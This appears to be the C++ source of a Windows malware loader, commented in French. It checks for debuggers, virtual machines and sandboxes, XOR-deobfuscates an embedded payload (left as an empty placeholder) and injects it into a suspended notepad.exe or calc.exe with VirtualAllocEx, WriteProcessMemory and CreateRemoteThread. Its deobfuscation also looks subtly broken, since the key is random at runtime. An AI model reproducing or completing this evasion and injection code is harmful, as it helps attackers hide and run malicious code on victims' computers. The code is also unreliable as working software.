#include <Windows.h>
#include <vector>
#include <algorithm>
#include <stdexcept>
#include <wincrypt.h>
#include <intrin.h>
#include <TlHelp32.h>
#include <chrono>
#include <thread>
#include <openssl/evp.h>
#include <fstream>
#include <sstream>
#include <iomanip>
#include "encryption.h"
#include "anti_analysis.h"
#include <openssl/sha.h>  // For SHA256_DIGEST_LENGTH

class XorObfuscator {
private:
    std::vector<uint8_t> m_key;
    mutable size_t m_counter = 0;
    volatile bool m_selfCheckValid = true;

    void SelfIntegrityCheck() const {
        const uint8_t* p = reinterpret_cast<const uint8_t*>(this);
        size_t checkSum = 0;
        for (size_t i = 0; i < sizeof(*this); ++i) checkSum += p[i];
        if (checkSum % 0xFF != 0x5A || !m_selfCheckValid) std::terminate();
    }

public:
    explicit XorObfuscator(size_t keySize = 64) : m_key(keySize) {
        HCRYPTPROV hProv = 0;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
            throw std::runtime_error("Échec CryptoAPI");
        if (!CryptGenRandom(hProv, static_cast<DWORD>(keySize), m_key.data())) {
            CryptReleaseContext(hProv, 0);
            throw std::runtime_error("Échec génération clé");
        }
        CryptReleaseContext(hProv, 0);
        VirtualLock(m_key.data(), m_key.size());
    }

    ~XorObfuscator() {
        SecureZeroMemory(m_key.data(), m_key.size());
        VirtualUnlock(m_key.data(), m_key.size());
        m_selfCheckValid = false;
    }

    std::vector<uint8_t> Deobfuscate(const std::vector<uint8_t>& data) const {
        SelfIntegrityCheck();
        std::vector<uint8_t> result(data.size());
        size_t keyIndex = m_counter % m_key.size();
        for (size_t i = 0; i < data.size(); ++i) {
            uint8_t keyByte = (m_key[keyIndex] << 3) | (m_key[keyIndex] >> 5);
            keyByte ^= static_cast<uint8_t>(i & 0xFF);
            result[i] = data[i] ^ keyByte;
            keyIndex = (keyIndex * 16777619) ^ (i % 256);
            m_counter++;
        }
        return result;
    }

    XorObfuscator(const XorObfuscator&) = delete;
    XorObfuscator& operator=(const XorObfuscator&) = delete;
};

bool VerifyStubIntegrity() {
    const std::vector<BYTE> obfuscatedHash = { /* Hash obfusqué */ };
    std::vector<BYTE> expectedHash(obfuscatedHash.begin(), obfuscatedHash.end());
    for (auto& byte : expectedHash) byte ^= 0xAA;

    std::ifstream file("stub.exe", std::ios::binary);
    if (!file) return false;

    EVP_MD_CTX* mdctx = EVP_MD_CTX_new();
    EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL);

    char buffer[1024];
    while (file.read(buffer, sizeof(buffer))) {
        EVP_DigestUpdate(mdctx, buffer, file.gcount());
    }

    unsigned char hash[SHA256_DIGEST_LENGTH];
    EVP_DigestFinal_ex(mdctx, hash, NULL);
    EVP_MD_CTX_free(mdctx);
    file.close();

    return memcmp(hash, expectedHash.data(), SHA256_DIGEST_LENGTH) == 0;
}

int main() {
    JunkCode();
    if (IsDebugged() || IsInsideVM() || IsSandboxed() || !VerifyStubIntegrity()) {
        DebugBreak();
        ExitProcess(0);
    }

    std::vector<uint8_t> encryptedPayload = { /* Payload obfusqué */ };
    XorObfuscator obfuscator(128);
    auto decryptedPayload = obfuscator.Deobfuscate(encryptedPayload);

    const char* targetProcesses[] = {"notepad.exe", "calc.exe"};
    const char* targetProcess = targetProcesses[rand() % 2];

    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(si) };
    if (CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, decryptedPayload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (remoteMem) {
            WriteProcessMemory(pi.hProcess, remoteMem, decryptedPayload.data(), decryptedPayload.size(), NULL);
            CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
        }
        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
